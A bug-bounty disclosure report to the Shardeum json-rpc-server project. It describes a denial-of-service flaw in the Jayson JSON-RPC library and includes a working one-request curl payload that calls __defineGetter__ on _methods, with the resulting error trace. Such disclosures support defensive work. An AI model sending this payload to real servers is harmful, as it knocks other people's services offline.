Report ID: #33577

Report type: Websites and Applications

Report severity: Insight

Target: https://github.com/shardeum/json-rpc-server/tree/dev

Impacts:
- Taking down the application/website

## Description
## Brief/Intro
After finding
https://bugs.immunefi.com/dashboard/submission/33571
I started to play around the same code of your HTTP server which is built on Jayson and, accidentally, found a similar 0-day vulnerability there. It requires just a single request to completely take down the application.

## Vulnerability Details
The vulnerability works a very similar way. When you create the Jayson server instance, you pass the methods into constructor:
```
const server = new jayson.Server(methods)
```
They are then parsed and stored within `server._methods` mapping.
When the request is sent to the server, it first resolves the methods the following way:
```
Server.prototype.getMethod = function(name) {
  return this._methods[name];
};
```
and then executes it passing the args inside:
```
handler.call(server, ...args);
```

As far as I understand, such a call is equivalent to
```js
server[method](...args);
```

This way, we can override some server fields using the same `__defineGetter__` function. I tried to override the `_methods` field itself and completely broke the server (look at PoC).

## Impact Details
Complete HTTP server take down.
        
## Proof of concept
## Proof of Concept
1. Start the JSON-RPC server
2. Send the following request with cURL:
```
curl http://172.16.205.128:8080 -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"__defineGetter__","params":["_methods"],"id":1}'
```
3. Try to send any valid request, for instance
```
curl http://172.16.205.128:8080 -X POST -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","method":"eth_gasPrice","params":[],"id":1}'
```
4. Make sure the traceback is returned and the same traceback is in server logs:
```
Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client

    at Server._methods (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:329:7)
    at Server.getMethod (/home/quantish/shardeum/json-rpc-server/node_modules/jayson/lib/server/index.js:190:15)
```

I think the different impacts are also possible here but I didn't dive deeper. The RCE couldn't be achieved though I think.

## Mitigation
Since this is a 0-day vulnerability in the 3rd-party library, I think you have the following options:
- report this issue to the vendor and await for the fix to be implemented (I can assist you with that if you want me to);
- use some other  JSON-RPC server library.
